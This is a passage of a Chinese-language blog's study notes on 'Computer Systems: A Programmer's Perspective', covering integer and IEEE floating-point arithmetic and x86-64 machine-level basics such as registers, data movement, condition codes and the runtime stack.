href="#无符号数求反" class="headerlink" title="无符号数求反"></a>无符号数求反</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185846184.png" alt="image-20210608185846184" style="zoom:67%;"></p><h4 id="2-3-2-补码加法"><a href="#2-3-2-补码加法" class="headerlink" title="2.3.2 补码加法"></a>2.3.2 补码加法</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185940296.png" alt="image-20210608185940296" style="zoom:67%;"></p><h5 id="检测补码加法中的溢出"><a href="#检测补码加法中的溢出" class="headerlink" title="检测补码加法中的溢出"></a>检测补码加法中的溢出</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190016605.png" alt="image-20210608190016605" style="zoom:67%;"></p><h4 id="2-3-3-补码的非"><a href="#2-3-3-补码的非" class="headerlink" title="2.3.3 补码的非"></a>2.3.3 补码的非</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190049598.png" alt="image-20210608190049598" style="zoom:67%;"></p><h4 id="2-3-4-无符号乘法"><a href="#2-3-4-无符号乘法" class="headerlink" title="2.3.4 无符号乘法"></a>2.3.4 无符号乘法</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190306482.png" alt="image-20210608190306482" style="zoom:67%;"></p><h4 id="2-3-5-补码乘法"><a href="#2-3-5-补码乘法" class="headerlink" title="2.3.5 补码乘法"></a>2.3.5 补码乘法</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190332236.png" alt="image-20210608190332236" style="zoom:67%;"></p><h5 id="无符号和补码乘法的位级等价性"><a href="#无符号和补码乘法的位级等价性" class="headerlink" title="无符号和补码乘法的位级等价性"></a>无符号和补码乘法的位级等价性</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190507561.png" alt="image-20210608190507561" style="zoom:67%;"></p><h4 id="2-3-6-乘以常数"><a href="#2-3-6-乘以常数" class="headerlink" title="2.3.6 乘以常数"></a>2.3.6 乘以常数</h4><ul><li><p>编译器使用了一项重要的优化，试着用移位和加法运算的组合来代替乘以常数因子的乘法。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190820347.png" alt="image-20210608190820347" style="zoom:67%;"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190839402.png" alt="image-20210608190839402" style="zoom:67%;"></p></li></ul><h4 id="2-3-7-除以2的幂"><a href="#2-3-7-除以2的幂" class="headerlink" title="2.3.7 除以2的幂"></a>2.3.7 除以2的幂</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608190931912.png" alt="image-20210608190931912" style="zoom:67%;"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608191005986.png" alt="image-20210608191005986" style="zoom:67%;"></p><ul><li><p>我们可以通过在移位前”偏置（biasing）”这个值，来修正这种不合适的舍入。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608191148416.png" alt="image-20210608191148416" style="zoom:67%;"></p></li><li><p>同乘法不同，我们不能用除以2的幂的除法来表示除以任何常数K的除法。</p></li></ul><h4 id="2-3-8-关于整数运算的最后思考"><a href="#2-3-8-关于整数运算的最后思考" class="headerlink" title="2.3.8 关于整数运算的最后思考"></a>2.3.8 关于整数运算的最后思考</h4><h3 id="2-4-浮点数"><a href="#2-4-浮点数" class="headerlink" title="2.4 浮点数"></a>2.4 浮点数</h3><h4 id="2-4-1-二进制小数"><a href="#2-4-1-二进制小数" class="headerlink" title="2.4.1 二进制小数"></a>2.4.1 二进制小数</h4><h4 id="2-4-2-IEEE浮点表示"><a href="#2-4-2-IEEE浮点表示" class="headerlink" title="2.4.2 IEEE浮点表示"></a>2.4.2 IEEE浮点表示</h4><ul><li><p>IEEE浮点标准用$V=(-1)^s<em>M</em>2^E$的形式来表示一个数：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608191808690.png" alt="image-20210608191808690"></p></li></ul><h5 id="标准浮点格式"><a href="#标准浮点格式" class="headerlink" title="标准浮点格式"></a>标准浮点格式</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608191905833.png" alt="image-20210608191905833" style="zoom:67%;"></p><h5 id="单精度浮点数值的分类"><a href="#单精度浮点数值的分类" class="headerlink" title="单精度浮点数值的分类"></a>单精度浮点数值的分类</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608192611586.png" alt="image-20210608192611586" style="zoom:67%;"></p><h5 id="情况1：规格化的值"><a href="#情况1：规格化的值" class="headerlink" title="情况1：规格化的值"></a>情况1：规格化的值</h5><ul><li><p>阶码的值$E=e-Bias$，其中$e$是无符号数，其位表示为$e_{k-1}…e_1e_0$，而$Bias$是一个等于$2^{k-1}-1$（单精度是127，双精度是1023）的偏置值。由此产生指数的取值范围，对于单精度是$-126$~$+127$，而对于双精度是$-1022$~$+1023$，</p></li><li><p>小数字段frac被解释为描述小数值$f$，其中$0\leq f&lt; 1$，其二进制表示为0，$f_{n-1}…f_1f_0$，也就是二进制小数点在最高有效位的左边。尾数定义为$M=1+f$。有时，这种方式也叫做<strong>隐含</strong>的以1开头的（implied leading 1）表示。</p></li></ul><h5 id="情况2：非规格化的值"><a href="#情况2：非规格化的值" class="headerlink" title="情况2：非规格化的值"></a>情况2：非规格化的值</h5><ul><li><p>阶码值是$E=1-Bias$，而尾数的值是$M=f$，也就是小数字段的值，不包含隐含的开头的1</p></li><li><p>符号位是0，阶码字段全为0（表明是一个非规格化值），而小数域也全为0，这就得到$M=f=0$。令人奇怪的是，当符号位为1，而其他域全为0时，我们得到值$-0.0$。</p></li></ul><h5 id="情况3：特殊值"><a href="#情况3：特殊值" class="headerlink" title="情况3：特殊值"></a>情况3：特殊值</h5><ul><li>最后一类数值时当指阶码全为1的时候出现的。当小数域全为0时，得到的值表示无穷，当$s=0$时是$+\infty$，或者当$s=1$时是$-\infty$。当我们把两个非常大的数相乘，或者除以零时，无穷能够表示<strong>溢出</strong>的结果。当小数域为非零时，结果值被称为“NaN”，即“不是一个数（Not a Number）”的缩写。</li></ul><h4 id="2-4-3-数字示例"><a href="#2-4-3-数字示例" class="headerlink" title="2.4.3 数字示例"></a>2.4.3 数字示例</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608194502658.png" alt="image-20210608194502658"></p><h4 id="2-4-4-舍入"><a href="#2-4-4-舍入" class="headerlink" title="2.4.4 舍入"></a>2.4.4 舍入</h4><ul><li>向偶数舍入在大多数现实情况中避免了这种统计误差。在50%的时间里，它将向上舍入，而在50%的时间里，它将向下舍入。</li><li>在我们不想舍入到整数时，也可以使用向偶数舍入。我们只是简单地考虑最低有效数字是奇数还是偶数。</li><li>相似地，向偶数舍入法能够运用在二进制小数上，我们将最低有效位的值0认为是偶数，值1认为是奇数。</li></ul><h4 id="2-4-5-浮点运算"><a href="#2-4-5-浮点运算" class="headerlink" title="2.4.5 浮点运算"></a>2.4.5 浮点运算</h4><h5 id="浮点加法"><a href="#浮点加法" class="headerlink" title="浮点加法"></a>浮点加法</h5><ul><li>浮点加法不具有结合性，这是缺少的最重要的群属性。</li><li>另一方面，浮点加法满足了单调性属性。</li></ul><h5 id="浮点乘法"><a href="#浮点乘法" class="headerlink" title="浮点乘法"></a>浮点乘法</h5><ul><li>它是可交换的。</li><li>它不具有可结合性。</li><li>在加法上不具备分配性。</li></ul><h4 id="2-4-6-C语言中的浮点数"><a href="#2-4-6-C语言中的浮点数" class="headerlink" title="2.4.6 C语言中的浮点数"></a>2.4.6 C语言中的浮点数</h4><h3 id="2-5-小结"><a href="#2-5-小结" class="headerlink" title="2.5 小结"></a>2.5 小结</h3><h2 id="第3章-程序的机器级表示"><a href="#第3章-程序的机器级表示" class="headerlink" title="第3章 程序的机器级表示"></a>第3章 程序的机器级表示</h2><ul><li>计算机执行<strong>机器代码</strong>，用字节序列编码低级的操作。</li></ul><h3 id="3-1-历史观点"><a href="#3-1-历史观点" class="headerlink" title="3.1 历史观点"></a>3.1 历史观点</h3><h3 id="3-2-程序编码"><a href="#3-2-程序编码" class="headerlink" title="3.2 程序编码"></a>3.2 程序编码</h3><ul><li>假设一个C程序，有两个文件p1.c和p2.c。我们用Unix命令行编译这些代码：</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">gcc -Og -o p p1.c p2.c</span><br></code></pre></div></td></tr></table></figure><ul><li>命令gcc指的就是GCC C编译器。因为这是Linux上默认的编译器，我们也可以简单地用cc来启动它。编译选项-Og告诉编译器使用会生成符合C代码整体结构的机器代码优化等级。使用较高级别优化产生的代码会严重变形，以至于产生的机器代码和初始源代码之间的关系非常难以理解。</li></ul><h4 id="3-2-1-机器级代码"><a href="#3-2-1-机器级代码" class="headerlink" title="3.2.1 机器级代码"></a>3.2.1 机器级代码</h4><ul><li><p>汇编代码表示非常接近于机器代码。与机器代码的二进制格式相比，汇编代码的主要特点是它用可读性更好的文本格式表示。</p><p>x86-64的机器代码与原始C代码的差别非常大。一些通常对C语言程序员隐藏的处理器状态都是可见的：</p><ul><li>程序计数器（通常称为“PC”，在x86-64中用%rip表示）给出将要执行的下一条指令在内存中的地址。</li><li>整数<strong>寄存器</strong>文件包含16个命名的位置，分别存储64位的值。这些寄存器可以存储地址（对应于C语言的指针）或整数数据。有的寄存器被用来记录某些重要的程序状态，而其他的寄存器用来保存临时数据，例如过程的参数和局部变量，以及函数的返回值。</li><li>条件码寄存器保存着最近执行的算术或逻辑指令的状态信息。它们用来实现控制或数据流中的条件变化，比如说用来实现if和while语句。</li><li>一组向量寄存器可以存放一个或多个整数或浮点数值。</li></ul></li></ul><h4 id="3-2-2-代码示例"><a href="#3-2-2-代码示例" class="headerlink" title="3.2.2 代码示例"></a>3.2.2 代码示例</h4><ul><li><p>要查看机器代码文件的内容，有一类称为<strong>反汇编器</strong>（disassembler）的程序非常有用。这些程序根据机器代码产生一种类似于汇编代码的格式。在Linux系统中，带‘-d’命令行标志的程序OBJDUMP（表示”object dump”）可以充当这个角色。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">objdump -d test.o</span><br></code></pre></div></td></tr></table></figure></li><li><p>其中一些关于机器代码和它的反汇编特性值得注意：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609161646145.png" alt="image-20210609161646145" style="zoom:67%;"></p></li></ul><h4 id="3-2-3-关于格式的注解"><a href="#3-2-3-关于格式的注解" class="headerlink" title="3.2.3 关于格式的注解"></a>3.2.3 关于格式的注解</h4><h3 id="3-3-数据格式"><a href="#3-3-数据格式" class="headerlink" title="3.3 数据格式"></a>3.3 数据格式</h3><ul><li>由于是从16位体系结构扩展成32位的，Intel用术语“字（word）”表示16位数据类型。因此，称32位数为”双字（double word）”，称64位数为“四字（quad word）”。</li></ul><h5 id="C语言数据类型在x86-64中的大小"><a href="#C语言数据类型在x86-64中的大小" class="headerlink" title="C语言数据类型在x86-64中的大小"></a>C语言数据类型在x86-64中的大小</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609161946987.png" alt="image-20210609161946987" style="zoom:67%;"></p><ul><li>大多数GCC指令都有一个字符的后缀，表明操作数的大小。</li></ul><h3 id="3-4-访问信息"><a href="#3-4-访问信息" class="headerlink" title="3.4 访问信息"></a>3.4 访问信息</h3><ul><li><p>一个x86-64的中央处理单元（CPU）包含一组16个存储64位值的<strong>通用目的寄存器</strong>。这些寄存器用来存储整数数据和指针。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609162219218.png" alt="image-20210609162219218" style="zoom:67%;"></p></li><li><p>指令可以对这16个寄存器的低位字节中存放的不同大小的数据进行操作。</p></li><li>生成1字节和2字节的数字的指令会保持剩下的字节不变；生成4字节数字的指令会把高位4个字节置为0。</li></ul><h4 id="3-4-1-操作数指示符"><a href="#3-4-1-操作数指示符" class="headerlink" title="3.4.1 操作数指示符"></a>3.4.1 操作数指示符</h4><ul><li>大多数指令有一个或多个<strong>操作数</strong>（operand），指示出执行一个操作中要使用的源数据值，以及放置结果的目的位置。</li><li>各种不同的操作数的可能性被分为三种类型：<ul><li><strong>立即数</strong>（immediate），立即数的书写方式是’$‘后面跟一个用标准C表示法表示的整数。</li><li><strong>寄存器</strong>（register）。我们用符号$r_a$表示任意寄存器$a$，用引用$R[r_a]$来表示它的值，这是将寄存器集合看出一个数字R，用寄存器表示符作为索引。</li><li><strong>内存</strong>引用。$M_b[Addr]$。</li></ul></li></ul><h5 id="操作数格式"><a href="#操作数格式" class="headerlink" title="操作数格式"></a>操作数格式</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609163308333.png" alt="image-20210609163308333" style="zoom:67%;"></p><h4 id="3-4-2-数据传送指令"><a href="#3-4-2-数据传送指令" class="headerlink" title="3.4.2 数据传送指令"></a>3.4.2 数据传送指令</h4><h5 id="最简单形式的数据传送指令——MOV类"><a href="#最简单形式的数据传送指令——MOV类" class="headerlink" title="最简单形式的数据传送指令——MOV类"></a>最简单形式的数据传送指令——MOV类</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609163410428.png" alt="image-20210609163410428" style="zoom: 80%;"></p><ul><li>源操作数指定的值是一个立即数，存储在寄存器中或内存中。目的操作数指定一个位置，要么是一个寄存器或者是一个内存地址。</li><li>x86-64加了一条限制，传送指令的两个操作数不能都指向内存位置。寄存器部分的大小必须与指令最后一个字符（’b‘，’w‘，’l‘或’q‘）指定的大小匹配。</li><li>任何为寄存器生成32位值的指令都会把该寄存器的高位部分置成0.</li></ul><h5 id="零扩展和符号扩展数据传送指令"><a href="#零扩展和符号扩展数据传送指令" class="headerlink" title="零扩展和符号扩展数据传送指令"></a>零扩展和符号扩展数据传送指令</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609163900487.png" alt="image-20210609163900487" style="zoom:67%;"></p><h4 id="3-4-3-数据传送示例"><a href="#3-4-3-数据传送示例" class="headerlink" title="3.4.3 数据传送示例"></a>3.4.3 数据传送示例</h4><ul><li>我们看到C语言中所谓的“指针”其实就是地址。间接引用指针就是将该指针放在一个寄存器中，然后在内存引用中使用这个寄存器。其次，像x这样的局部变量通常是保存在寄存器中，而不是内存中。</li><li>访问寄存器比访问内存快得多。</li></ul><h4 id="3-4-4-压入和弹出栈数据"><a href="#3-4-4-压入和弹出栈数据" class="headerlink" title="3.4.4 压入和弹出栈数据"></a>3.4.4 压入和弹出栈数据</h4><ul><li><p>栈可以实现位一个数组，总是从数组的一段插入和删除元素。这一端被称为<strong>栈顶</strong>。</p></li><li><p>栈向下增长。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609164424857.png" alt="image-20210609164424857"></p></li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609164517185.png" alt="image-20210609164517185"></p><ul><li>无论如何，%rsp指向的地址总是栈顶。</li></ul><h3 id="3-5-算术和逻辑操作"><a href="#3-5-算术和逻辑操作" class="headerlink" title="3.5 算术和逻辑操作"></a>3.5 算术和逻辑操作</h3><h5 id="整数算术操作"><a href="#整数算术操作" class="headerlink" title="整数算术操作"></a>整数算术操作</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210609164615864.png" alt="image-20210609164615864"></p><h4 id="3-5-1-加载有效地址"><a href="#3-5-1-加载有效地址" class="headerlink" title="3.5.1 加载有效地址"></a>3.5.1 加载有效地址</h4><ul><li><strong>加载有效地址</strong>（load吗effective address）指令leaq实际上是movq指令的变形。</li><li>我们用C语言的地址操作符&amp;S说明这种计算。</li><li>它还可以简洁地描述普通的算术操作。例如如果寄存器%rdx的值为x，那么指令leaq 7(%rdx,%rdx,4),%rax将设置寄存器%rax的值为5x+7。</li></ul><h4 id="3-5-2-一元和二元操作"><a href="#3-5-2-一元和二元操作" class="headerlink" title="3.5.2 一元和二元操作"></a>3.5.2 一元和二元操作</h4><ul><li>一元操作只有一个操作数，即是源又是目的。这个操作数可以是一个寄存器，也可以是一个内存位置。</li><li>二元操作的第一个操作数可以是立即数，寄存器或是内存地址。第二个操作数可以是寄存器或是内存位置。</li></ul><h4 id="3-5-3-移位操作"><a href="#3-5-3-移位操作" class="headerlink" title="3.5.3 移位操作"></a>3.5.3 移位操作</h4><ul><li>移位量可以是一个立即数，或是放在单字节寄存器%cl中。（这些指令很特别，因为只允许以这个特定发的寄存器作为操作数。）</li><li>x86-64中，移位操作对$w$位长的数据值进行操作，移位量由%cl寄存器的低$m$决定的，这里$2^m=w$。高位会被忽略。</li><li>移位操作的目的操作数可以是一个寄存器或是一个内存位置。</li></ul><h4 id="3-5-4-讨论"><a href="#3-5-4-讨论" class="headerlink" title="3.5.4 讨论"></a>3.5.4 讨论</h4><h4 id="3-5-5-特殊的算术操作"><a href="#3-5-5-特殊的算术操作" class="headerlink" title="3.5.5 特殊的算术操作"></a>3.5.5 特殊的算术操作</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210610230126901.png" alt="image-20210610230126901"></p><ul><li>这两条指令都要求一个参数必须在寄存器%rax中，而另一个作为指令的源操作数给出。然后乘积存放在寄存器%rdx（高64位）和%rax（低64位）中。</li><li>有符号出发指令idivl将寄存器%rdx（高64位）和%rax（低64位）中的128位数作为被除数，而除数作为指令的操作数给出。指令将商存储在寄存器%rax中，将余数存储在寄存器%rdx中。</li></ul><h3 id="3-6-控制"><a href="#3-6-控制" class="headerlink" title="3.6 控制"></a>3.6 控制</h3><ul><li>机器代码提供两种基本的低级机制来实现有条件的行为：测试数据值，然后根据测试的结果来改变控制流或者数据流。</li></ul><h4 id="3-6-1-条件码"><a href="#3-6-1-条件码" class="headerlink" title="3.6.1 条件码"></a>3.6.1 条件码</h4><ul><li><p>除了整数寄存器，CPU还维护着一组单个位的<strong>条件码</strong>（condition code）寄存器。</p></li><li><p>最常用的条件码有：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611140345510.png" alt="image-20210611140345510"></p></li><li><p>leaq指令不改变任何条件码，因为它是用来进行地址计算的。除此之外，图3-10中列出的所有指令都会设置条件码。</p></li><li><p>对于逻辑操作，例如XOR，进位标志和溢出标志会设置为0。</p></li><li><p>对于移位操作，进位标志将设置为最后一个被移出的位，而溢出标志设置为0。</p></li><li><p>INC和DEC指令会设置溢出和零标志，但是不会改变进位标志。</p></li><li><p>还有两类指令（有8、16、32和64位形式），它们只设置条件码而不改变任何其他寄存器；如图3-13所示。</p></li><li><p>CMP指令根据两个操作数的差来设置条件码。除了只设置条件码而不更新目的寄存器之外，CMP指令与SUB指令的行为是一样的。</p></li><li><p>TEST指令的行为和AND指令一样，除了它们只设置条件码而不改变目的寄存器的值。典型的用法是，两个操作数是一样的（例如，testq %rax，%rax用来检查%rax是负数、零还是正数），或其中的一个操作数是一个掩码，用来指示哪些位应该被测试。</p></li></ul><h4 id="3-6-2-访问条件码"><a href="#3-6-2-访问条件码" class="headerlink" title="3.6.2 访问条件码"></a>3.6.2 访问条件码</h4><ul><li><p>条件码通常不会直接读取，常用的使用方法有三种：</p><ul><li>1）可以根据条件码的某种组合，将一个字节设置为0或者1</li><li>2）可以条件跳转到程序的某个其他部分</li><li>3）可以有条件地传送数据</li></ul></li><li><p>对于第一种情况，我们将这一整类指令称为SET指令</p></li><li><p>一条SET指令的目的操作数是低位字节寄存器元素（图3-2）之一，或是一个字节的内存位置，指令会将这个字节设置成0或者1。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611141336406.png" alt="image-20210611141336406" style="zoom:67%;"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611141452316.png" alt="image-20210611141452316"></p></li><li><p>注意cmpq指令的比较顺序（第2行）。虽然参数列出的顺序先是%rsi（b）再是%rdi（a），实际上比较的是a和b。还要记得，正如在3.4.2节种讨论过的那样，movzbl指令不仅会把%eax的高3个字节清零，还会把整个寄存器%rax的高4个字节都清零。</p></li><li><p>图3-15列举了不同的跳转指令。jmp指令是无条件跳转，它可以是<strong>直接</strong>跳转，即跳转目标作为指令的一部分编码；也可以是<strong>间接</strong>跳转，即跳转目标是从寄存器或内存位置中读出的。</p></li></ul><h4 id="3-6-5-用条件控制来实现条件分支"><a href="#3-6-5-用条件控制来实现条件分支" class="headerlink" title="3.6.5 用条件控制来实现条件分支"></a>3.6.5 用条件控制来实现条件分支</h4><ul><li>将条件表达式和语句从C语言翻译成机器代码，最常用的方式是结合有条件和无条件跳转。</li></ul><h4 id="3-6-6-用条件传送来实现条件分支"><a href="#3-6-6-用条件传送来实现条件分支" class="headerlink" title="3.6.6 用条件传送来实现条件分支"></a>3.6.6 用条件传送来实现条件分支</h4><ul><li><p>实现条件操作的传统方法是通过使用<strong>控制</strong>的条件转移。当条件满足时，程序沿着一条执行路径执行，而当条件不满足时，就走另一条路径。这种机制简单而通用，但是在现代处理器上，它可能会非常低效。</p></li><li><p>一种替代策略是使用<strong>数据</strong>的条件转移。这种方法计算一个条件操作的两种结果，然后再根据条件是否满足从中选取一个。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611142314421.png" alt="image-20210611142314421"></p></li><li><p>处理器通过使用<strong>流水线</strong>（pipelining）来获取高性能。</p></li><li><p>当机器遇到条件跳转（也称为“分支”）时，只有当分支条件求值完成之后，才能决定分支往哪边走。处理器采用非常精密的<strong>分支预测逻辑</strong>来猜测每条跳转指令是否会执行。只要它的猜测还比较可靠，指令流水线中就会充满着指令。另一方面，错误预测一个跳转，要求处理器丢掉它为该跳转指令后所有指令已做的工作，然后再开始用从正确位置处起始的指令去填充流水线。</p></li><li><p>汇编器可以从目标寄存器的名字推断出条件传送指令的操作数长度，所以对所有的操作数长度，都可以使用同一个的指令名字。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611143139222.png" alt="image-20210611143139222"></p><ul><li>同条件跳转不同，处理器无需预测测试的结果就可以执行条件传送。</li></ul></li><li><p>编译器必须考虑浪费的计算和由于分支预测错误所造成的性能出发之间的相对性能。说实话，编译器并不具有足够的信息来做出可靠的决定。</p><ul><li>对GCC的实验表明，只有当两个表达式都很容易计算时，例如表达式分别都只是一个加法指令，它才会使用条件传送。</li><li>即时许多分支预测错误的开销会超过更复杂的计算，GCC还是会使用条件控制转移。</li></ul></li></ul><h4 id="3-6-7-循环"><a href="#3-6-7-循环" class="headerlink" title="3.6.7 循环"></a>3.6.7 循环</h4><h5 id="1-do-while循环"><a href="#1-do-while循环" class="headerlink" title="1.do-while循环"></a>1.do-while循环</h5><h5 id="2-while循环"><a href="#2-while循环" class="headerlink" title="2.while循环"></a>2.while循环</h5><h5 id="3-for循环"><a href="#3-for循环" class="headerlink" title="3.for循环"></a>3.for循环</h5><h4 id="3-6-8-switch语句"><a href="#3-6-8-switch语句" class="headerlink" title="3.6.8 switch语句"></a>3.6.8 switch语句</h4><ul><li>switch（开关）语句可以根据一个整数索引值进行多重分支（multiway branching）。</li><li>在处理具有多种可能结果的测试时，这种语句特别有用。它们不仅提高了C代码的可读性，而且通过<strong>跳转表</strong>（jump table）这种数据结果使得实现更加高效。</li></ul><h3 id="3-7-过程"><a href="#3-7-过程" class="headerlink" title="3.7 过程"></a>3.7 过程</h3><ul><li>过程P调用过程Q，Q执行后返回到P。这些动作包括下面一个或多个机制：<ul><li><strong>传递控制</strong>。在进入过程Q的时候，程序计数器必须被设置为Q的代码的起始地址，然后在返回时，要把程序计数器设置为P中调用Q后面那条指令的地址。</li><li><strong>传递数据</strong>。P必须能够向Q提供一个或多个参数，Q必须能够向P返回一个值。</li><li><strong>分配和释放内存</strong>。在开始时，Q可能需要为局部变量分配空间，而在返回前，又必须释放这些存储空间。</li></ul></li></ul><h4 id="3-7-1-运行时栈"><a href="#3-7-1-运行时栈" class="headerlink" title="3.7.1 运行时栈"></a>3.7.1 运行时栈</h4><ul><li><p>当P调用Q时，控制和数据信息添加到栈尾。当P返回时，这些信息会被释放掉。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611144432716.png" alt="image-20210611144432716"></p></li><li><p>通过寄存器，过程P可以传递最多6个整数值（也就是指针和整数），但是如果Q需要更多的参数，P可以在调用Q之前在栈帧里存储好这些参数。</p></li></ul><h4 id="3-7-2-转移控制"><a href="#3-7-2-转移控制" class="headerlink" title="3.7.2 转移控制"></a>3.7.2 转移控制</h4><ul><li><p>这个信息是用指令call Q调用过程Q来记录的。该指令会把地址A压入栈中，并将PC设置为Q的起始地址。压入的地址A称为返回地址，是紧跟在call指令后面的那条指令的地址。对应的指令ret会从栈中弹出地址A，并将PC设置为A。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611145504797.png" alt="image-20210611145504797"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611145521279.png" alt="image-20210611145521279"></p></li></ul><h4 id="3-7-3-数据传送"><a href="#3-7-3-数据传送" class="headerlink" title="3.7.3 数据传送"></a>3.7.3 